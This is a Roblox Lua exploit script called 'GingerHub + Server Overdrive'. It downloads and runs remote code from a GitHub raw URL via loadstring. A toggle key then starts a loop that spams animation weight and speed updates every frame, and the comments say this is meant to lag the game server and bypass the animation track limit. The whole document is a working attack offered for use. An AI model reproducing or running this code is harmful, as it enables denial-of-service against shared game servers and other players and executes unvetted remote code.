-- // GINGERHUB + SERVER OVERDRIVE [JAN 2026] \\ --

local GINGERHUB_LINK = "https://raw.githubusercontent.com/panoww07/gingerhub/refs/heads/main/apstein.lua"
local player = game.Players.LocalPlayer
local active = false
local confusionId = "rbxassetid://15264639453" -- High-Complexity UGC ID

-- 1. THE HUB LOADER (Attempts to load your GitHub file)
task.spawn(function()
    local success, err = pcall(function()
        loadstring(game:HttpGet(GINGERHUB_LINK))()
    end)
    if not success then
        warn("GingerHub Loader: Link still 404 or Private. Lag script is still ready.")
    end
end)

-- 2. NOTIFICATION SYSTEM
local function notify(state)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "GingerHub",
        Text = state and "OVERDRIVE: ACTIVE (Lagging Server)" or "OVERDRIVE: DISABLED",
        Duration = 3,
        Button1 = "OK"
    })
end

-- 3. TOGGLE KEY (K)
game:GetService("UserInputService").InputBegan:Connect(function(i, g)
    if not g and i.KeyCode == Enum.KeyCode.K then
        active = not active
        notify(active)
    end
end)

-- 4. THE SERVER STRESSER LOOP
-- Uses the 'Weight-Spam' bypass to avoid the 32-track limit
game:GetService("RunService").Heartbeat:Connect(function()
    if active then
        local char = player.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local animator = hum and hum:FindFirstChildOfClass("Animator")
        
        if animator then
            -- BYPASS: Clean tracks to stay at 0/32 tracks used
            for _, t in pairs(animator:GetPlayingAnimationTracks()) do
                t:Destroy()
            end

            -- PAYLOAD: Load and flood with property updates
            local a = Instance.new("Animation")
            a.AnimationId = confusionId
            
            local success, t = pcall(function() return animator:LoadAnimation(a) end)
            
            if success and t then
                t:Play()

                -- HEAVY PACKET SPAM
                -- We use 400 iterations with complex math to force server-side recalculation
                for i = 1, 400 do
                    t:AdjustWeight(math.random(1, 1000000) / 100)
                    t:AdjustSpeed(math.random(1, 1000000) / 100)
                end
                
                -- Fast cleanup to keep your connection from timing out
                task.spawn(function()
                    task.wait()
                    t:Destroy()
                    a:Destroy()
                end)
            end
        end
    end
end)

print("GingerHub & Overdrive Loaded. Press 'K' to Toggle.")
